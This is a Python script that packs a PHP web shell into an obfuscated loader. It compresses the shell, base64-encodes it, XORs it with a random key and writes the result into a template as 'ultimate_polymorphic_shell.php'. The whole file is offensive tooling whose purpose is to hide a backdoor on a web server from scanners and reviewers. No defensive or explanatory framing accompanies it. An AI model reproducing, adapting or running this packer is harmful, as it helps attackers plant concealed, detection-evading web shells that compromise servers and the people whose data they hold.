#!/usr/bin/env python3
import os
import base64
import secrets
import hashlib
import zlib

def encrypt_shell(shell_content, key):
    """Encrypt the shell content using a simple but effective method"""
    # First, compress the content to reduce size and add some obfuscation
    compressed = zlib.compress(shell_content.encode('utf-8'))
    
    # Base64 encode the compressed content
    encoded = base64.b64encode(compressed).decode('utf-8')
    
    # Simple XOR encryption with the key
    key_bytes = hashlib.sha256(key.encode()).digest()
    encrypted = []
    
    for i, char in enumerate(encoded):
        key_char = key_bytes[i % len(key_bytes)]
        encrypted.append(chr(ord(char) ^ key_char))
    
    # Return the final encrypted string
    return base64.b64encode(''.join(encrypted).encode('utf-8')).decode('utf-8')

def generate_shell(main_shell_path, loader_template_path, output_path):
    """Generate the final shell with encrypted payload"""
    # Generate a random key
    key = secrets.token_hex(8)
    
    # Read the main shell content
    with open(main_shell_path, 'r', encoding='utf-8') as f:
        main_shell = f.read()
    
    # Remove PHP opening tag if present
    main_shell = main_shell.strip()
    if main_shell.startswith('<?php'):
        main_shell = main_shell[5:].strip()
    
    # Remove PHP closing tag if present
    if main_shell.endswith('?>'):
        main_shell = main_shell[:-2].strip()
    
    # Read the loader template
    with open(loader_template_path, 'r', encoding='utf-8') as f:
        loader_template = f.read()
    
    # Encrypt the main shell
    encrypted_shell = encrypt_shell(main_shell, key)
    
    # Replace placeholders in the loader template
    final_loader = loader_template.replace('$key = "my_secret_key"', f'$key = "{key}"')
    final_loader = final_loader.replace('$payload = "ENCRYPTED_PAYLOAD_PLACEHOLDER"', f'$payload = "{encrypted_shell}"')
    
    # Write the final shell to the output path
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(final_loader)
    
    print(f"Shell generated successfully at {output_path}")
    print(f"Key: {key}")
    print(f"Size: {os.path.getsize(output_path)} bytes")

if __name__ == "__main__":
    # Paths
    main_shell_path = "main_shell.php"
    loader_template_path = "shell_loader.php"
    output_path = "ultimate_polymorphic_shell.php"
    
    # Generate the shell
    generate_shell(main_shell_path, loader_template_path, output_path)
